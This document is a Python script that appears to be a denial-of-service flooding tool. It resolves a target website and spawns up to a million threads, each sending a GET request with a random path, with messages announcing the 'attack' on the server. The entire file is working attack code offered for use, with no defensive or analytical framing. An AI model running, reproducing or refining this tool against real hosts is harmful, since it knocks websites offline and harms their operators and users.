import random
import socket
import string
import sys
import threading
import time

# Parse inputs
host = ""
ip = ""
port = 0
num_requests = 0


# Print thread status
def print_status():
    """Displaying the current thread number"""
    global thread_num
    thread_num_mutex.acquire(True)

    thread_num += 1
    print("\n " + "[" + str(thread_num) + "] ...hold your horses... ")
    thread_num_mutex.release()


# Generate URL Path
def generate_url_path():
    """Generate the url path using letters digits and punctuation"""
    msg = str(string.ascii_letters + string.digits + string.punctuation)
    # randomly create data from message created above
    data = "".join(random.sample(msg, 5))
    return data


# Perform the request
def attack():
    """Attacking the target server"""
    print_status()
    url_path = generate_url_path()

    # Create a raw socket
    dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # Open the connection on that raw socket
        dos.connect((ip, port))
        attack_link = f"GET {url_path} HTTP/1.1\nHost: {host}\n\n"
        dos.send(attack_link.encode('utf-8'))

    except socket.error as e:
        print("\n [No connection, server may be down]: " + str(e))
    finally:
        # Close our socket
        dos.shutdown(socket.SHUT_RDWR)
        dos.close()


def print_message():
    """Message on the terminal"""
    print("[#] Attack started on " + host + " (" + ip + ") || Port: " +
          str(port) + " || # Requests: " + str(num_requests))
    print("Sending requests...")
    time.sleep(3)

if __name__ == "__main__":

    if len(sys.argv) == 2:
        port = 80
        num_requests = 1000000
    elif len(sys.argv) == 3:
        port = int(sys.argv[2])
        num_requests = 1000000
    elif len(sys.argv) == 4:
        port = int(sys.argv[2])
        num_requests = int(sys.argv[3])
    else:
        print("ERROR\n Usage: " + sys.argv[0] + " < Hostname > ")
        sys.exit(1)

    # Convert FQDN to IP
    try:
        host = str(sys.argv[1]).replace(
            "https://", "").replace("http://", "").replace("www.", "")
        ip = socket.gethostbyname(host)
    except socket.gaierror:
        print(" ERROR\n Make sure you entered a correct website")
        sys.exit(2)

    # Create a shared variable for thread counts
    thread_num = 0
    thread_num_mutex = threading.Lock()

    # print the info of the target server
    print_message()
    # attack
    attack()
    
    # Spawn a thread per request
    all_threads = []
    for i in range(num_requests):
        t1 = threading.Thread(target=attack)
        t1.start()
        all_threads.append(t1)

        # Adjusting this sleep time will affect requests per second
        request_per_second = 0.05
        time.sleep(request_per_second)

    for current_thread in all_threads:
        # Make the main thread wait for the children threads
        current_thread.join()  
